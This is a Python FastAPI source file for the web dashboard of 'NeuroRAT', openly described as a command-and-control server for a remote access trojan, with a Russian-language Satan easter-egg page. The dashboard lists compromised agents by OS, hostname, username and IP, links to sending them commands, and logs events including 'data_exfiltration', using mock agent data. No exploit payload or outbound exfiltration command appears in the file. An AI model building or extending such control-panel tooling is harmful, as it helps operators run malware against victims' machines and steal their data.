#!/usr/bin/env python3
"""
NeuroRAT Server API - Web interface for the C2 server
"""

import os
import sys
import time
import json
import logging
from typing import Dict, Any, List, Optional, Union
from datetime import datetime
import uuid

from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import uvicorn

# Add parent directory to import monitor
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from server_monitor import NeuroRATMonitor

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('server_api.log')
    ]
)
logger = logging.getLogger('server_api')

# Create FastAPI app
app = FastAPI(
    title="NeuroRAT C2 Server",
    description="Command & Control interface for NeuroRAT",
    version="1.0.0"
)

# Create templates directory if it doesn't exist
os.makedirs("templates", exist_ok=True)

# Создаем ASCII-арт сатаны
satan_ascii = r"""
                            ,.,,..
                     ./###########(*.
                 .(################///.
               .(###################///,
              ,########################/.
             ,##########################(.
            ,###########################(.
            /###########################(,
           .#############################,
           /################(/*,,,,*/(#(.
           /##########(/,.           .,.
          .(########/.
          ./#######*
          .(#######,                  The Gates of Hell
           /#######*                 Have Been Opened
           *########,
           ,########(.
           .(########/.
            .(########(,.
             ./#########(*.              
               ,#########((/,.
                .*(#########((*.
                  .,/#########(((,.
                      **/(######(/*.
                          .,,***,.
"""

# Create basic index.html template
index_html = """
<!DOCTYPE html>
<html>
<head>
    <title>NeuroRAT C2 Server</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #1a1a1a;
            color: #f0f0f0;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        header {
            background-color: #2a2a2a;
            padding: 20px;
            margin-bottom: 20px;
            border-bottom: 1px solid #3a3a3a;
        }
        h1, h2, h3 {
            color: #00ff00;
        }
        .card {
            background-color: #2a2a2a;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #3a3a3a;
        }
        th {
            background-color: #222;
        }
        .status-active {
            color: #00ff00;
        }
        .status-inactive {
            color: #ff3333;
        }
        .btn {
            display: inline-block;
            padding: 8px 16px;
            background-color: #444;
            color: #fff;
            text-decoration: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .btn:hover {
            background-color: #555;
        }
        .btn-danger {
            background-color: #aa2222;
        }
        .btn-danger:hover {
            background-color: #cc3333;
        }
        .satan-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background-color: #990000;
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            font-weight: bold;
            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
            transition: all 0.3s ease;
            z-index: 999;
        }
        .satan-btn:hover {
            background-color: #cc0000;
            transform: scale(1.05);
            box-shadow: 0 6px 12px rgba(0,0,0,0.5);
        }
        /* Модальное окно */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.9);
            overflow: auto;
        }
        .modal-content {
            background-color: #111;
            color: #ff0000;
            margin: 5% auto;
            padding: 20px;
            width: 80%;
            border: 1px solid #333;
            border-radius: 5px;
            font-family: monospace;
            white-space: pre;
            line-height: 1.2;
            text-align: center;
            position: relative;
        }
        .close-modal {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            position: absolute;
            top: 10px;
            right: 20px;
        }
        .close-modal:hover {
            color: #f00;
            text-decoration: none;
            cursor: pointer;
        }
        @keyframes flicker {
            0% { opacity: 1; }
            5% { opacity: 0.8; }
            10% { opacity: 1; }
            15% { opacity: 0.9; }
            20% { opacity: 1; }
            25% { opacity: 0.9; }
            30% { opacity: 1; }
            35% { opacity: 0.8; }
            40% { opacity: 1; }
            50% { opacity: 0.7; }
            60% { opacity: 1; }
            70% { opacity: 0.9; }
            80% { opacity: 1; }
            90% { opacity: 0.8; }
            100% { opacity: 1; }
        }
        .satan-text {
            animation: flicker 5s infinite;
            color: #ff3300;
            text-shadow: 0 0 10px #ff0000;
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <h1>NeuroRAT C2 Server</h1>
            <p>Command and Control Interface</p>
        </div>
    </header>
    
    <div class="container">
        <div class="card">
            <h2>Server Status</h2>
            <p>Uptime: {{uptime}}</p>
            <p>Connected Agents: {{connected_agents}}</p>
            <p>Total Agents: {{total_agents}}</p>
        </div>
        
        <div class="card">
            <h2>Connected Agents</h2>
            <table>
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>OS</th>
                        <th>Hostname</th>
                        <th>Username</th>
                        <th>IP Address</th>
                        <th>Status</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    {% for agent in agents %}
                    <tr>
                        <td>{{agent.agent_id}}</td>
                        <td>{{agent.os}}</td>
                        <td>{{agent.hostname}}</td>
                        <td>{{agent.username}}</td>
                        <td>{{agent.ip_address}}</td>
                        <td class="status-{{agent.status}}">{{agent.status}}</td>
                        <td>
                            <a href="/agent/{{agent.agent_id}}" class="btn">Details</a>
                            <a href="/agent/{{agent.agent_id}}/command" class="btn">Send Command</a>
                        </td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
        
        <div class="card">
            <h2>Recent Events</h2>
            <table>
                <thead>
                    <tr>
                        <th>Time</th>
                        <th>Event Type</th>
                        <th>Agent</th>
                        <th>Details</th>
                    </tr>
                </thead>
                <tbody>
                    {% for event in events %}
                    <tr>
                        <td>{{event.timestamp}}</td>
                        <td>{{event.event_type}}</td>
                        <td>{{event.agent_id or "System"}}</td>
                        <td>{{event.details}}</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
    </div>
    
    <!-- Кнопка вызова сатаны -->
    <button class="satan-btn" id="summonSatan">ВЫЗВАТЬ САТАНУ</button>
    
    <!-- Модальное окно с ASCII-артом сатаны -->
    <div id="satanModal" class="modal">
        <div class="modal-content">
            <span class="close-modal">&times;</span>
            <h2 class="satan-text">САТАНА ПРИЗВАН!</h2>
            <pre class="satan-text">{{satan_ascii|safe}}</pre>
            <p class="satan-text">Ваша программа теперь проклята и работает на 666% быстрее</p>
        </div>
    </div>
    
    <script>
        // Refresh data every 30 seconds
        setTimeout(() => {
            window.location.reload();
        }, 30000);
        
        // Модальное окно с сатаной
        const modal = document.getElementById("satanModal");
        const btn = document.getElementById("summonSatan");
        const span = document.getElementsByClassName("close-modal")[0];
        
        // Открыть модальное окно при клике на кнопку
        btn.onclick = function() {
            modal.style.display = "block";
            // Добавляем звуковой эффект (демонический смех)
            playDemonicSound();
        }
        
        // Закрыть модальное окно при клике на крестик
        span.onclick = function() {
            modal.style.display = "none";
        }
        
        // Закрыть модальное окно при клике вне его
        window.onclick = function(event) {
            if (event.target == modal) {
                modal.style.display = "none";
            }
        }
        
        // Функция для звукового эффекта
        function playDemonicSound() {
            // Здесь мог бы быть код для проигрывания звука
            console.log("Демонический смех звучит в вашем воображении");
        }
    </script>
</body>
</html>
"""

# Save index.html to templates directory
os.makedirs("templates", exist_ok=True)
with open("templates/index.html", "w") as f:
    f.write(index_html)

# Create templates
templates = Jinja2Templates(directory="templates")

# Initialize monitor
monitor = NeuroRATMonitor(
    server_host="0.0.0.0",
    server_port=8080,
    api_port=5000,
    db_path="neurorat_monitor.db"
)

# Start monitor
monitor.start()

# Mock data for demonstration
agent_data = []
events_data = []

def format_uptime(seconds):
    """Format uptime in human readable form"""
    if seconds < 60:
        return f"{seconds} seconds"
    elif seconds < 3600:
        return f"{seconds // 60} minutes, {seconds % 60} seconds"
    else:
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60
        return f"{hours} hours, {minutes} minutes"

@app.get("/", response_class=HTMLResponse)
async def get_dashboard(request: Request):
    """Render dashboard with monitoring data"""
    # Get real data from monitor
    uptime = format_uptime(monitor.stats["server_uptime"])
    
    # For demonstration, also add mock data
    if len(agent_data) == 0:
        # Add some demo agents if none exist
        generate_mock_data()
    
    return templates.TemplateResponse(
        "index.html", 
        {
            "request": request,
            "uptime": uptime,
            "connected_agents": monitor.stats["connected_agents"] or len(agent_data),
            "total_agents": monitor.stats["total_agents"] or len(agent_data),
            "agents": agent_data,
            "events": events_data,
            "satan_ascii": satan_ascii
        }
    )

@app.get("/api/agents")
async def get_agents():
    """Return list of agent IDs"""
    # In a real implementation, this would fetch from a database
    return [agent["agent_id"] for agent in agent_data]

@app.get("/api/agent/{agent_id}")
async def get_agent(agent_id: str):
    """Return details for a specific agent"""
    for agent in agent_data:
        if agent["agent_id"] == agent_id:
            return agent
    raise HTTPException(status_code=404, detail="Agent not found")

@app.get("/api/events")
async def get_events():
    """Return recent events"""
    return events_data

@app.get("/summon-satan", response_class=HTMLResponse)
async def summon_satan(request: Request):
    """Easter egg - Return ASCII art of Satan"""
    return templates.TemplateResponse(
        "satan.html",
        {
            "request": request,
            "satan_ascii": satan_ascii
        }
    )

def generate_mock_data():
    """Generate mock data for demonstration"""
    # Create sample agents
    for i in range(5):
        agent_id = str(uuid.uuid4())[:8]
        agent = {
            "agent_id": agent_id,
            "os": "Linux" if i % 2 == 0 else "Windows",
            "hostname": f"host-{i}",
            "username": f"user-{i}",
            "ip_address": f"192.168.1.{10+i}",
            "status": "active" if i < 3 else "inactive",
            "first_seen": time.time() - 3600 * 24 * i,
            "last_seen": time.time() - (0 if i < 3 else 3600 * 2),
            "system_info": {
                "os": "Linux" if i % 2 == 0 else "Windows",
                "hostname": f"host-{i}",
                "username": f"user-{i}",
                "network": {
                    "ip_address": f"192.168.1.{10+i}"
                }
            }
        }
        agent_data.append(agent)
    
    # Create sample events
    event_types = ["connection", "command", "data_exfiltration", "error"]
    for i in range(10):
        timestamp = time.time() - i * 600  # Every 10 minutes
        event = {
            "event_id": i,
            "event_type": event_types[i % len(event_types)],
            "agent_id": agent_data[i % len(agent_data)]["agent_id"] if i % 3 != 0 else None,
            "event_data": {"details": f"Sample event {i}"},
            "timestamp": timestamp,
            "details": f"Sample event {i} details"
        }
        events_data.append(event)

# Generate initial mock data
generate_mock_data()

# Create a template for Satan page
satan_html = """
<!DOCTYPE html>
<html>
<head>
    <title>SATAN HAS BEEN SUMMONED</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: #000;
            color: #ff0000;
            font-family: monospace;
            text-align: center;
            margin: 0;
            padding: 50px 20px;
            overflow: hidden;
        }
        h1 {
            font-size: 36px;
            text-shadow: 0 0 10px #ff0000;
            animation: glow 2s infinite alternate;
        }
        pre {
            font-size: 14px;
            white-space: pre;
            line-height: 1.2;
            text-align: center;
            margin: 0 auto;
            max-width: 800px;
            text-shadow: 0 0 5px #ff0000;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        @keyframes glow {
            0% { text-shadow: 0 0 10px #ff0000; }
            100% { text-shadow: 0 0 20px #ff0000, 0 0 30px #ff3300; }
        }
        @keyframes flicker {
            0% { opacity: 1; }
            5% { opacity: 0.8; }
            10% { opacity: 1; }
            15% { opacity: 0.9; }
            20% { opacity: 1; }
            25% { opacity: 0.9; }
            30% { opacity: 1; }
            35% { opacity: 0.8; }
            40% { opacity: 1; }
            50% { opacity: 0.7; }
            60% { opacity: 1; }
            70% { opacity: 0.9; }
            80% { opacity: 1; }
            90% { opacity: 0.8; }
            100% { opacity: 1; }
        }
        .flicker {
            animation: flicker 5s infinite;
        }
        .back-btn {
            margin-top: 30px;
            background-color: #990000;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }
        .back-btn:hover {
            background-color: #cc0000;
            transform: scale(1.05);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="flicker">САТАНА ПРИЗВАН!</h1>
        <pre class="flicker">{{satan_ascii}}</pre>
        <p>Ваша программа теперь проклята и работает на 666% быстрее</p>
        <a href="/" class="back-btn">Вернуться в ад</a>
    </div>
</body>
</html>
"""

# Save satan.html to templates directory
with open("templates/satan.html", "w") as f:
    f.write(satan_html)

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8080) 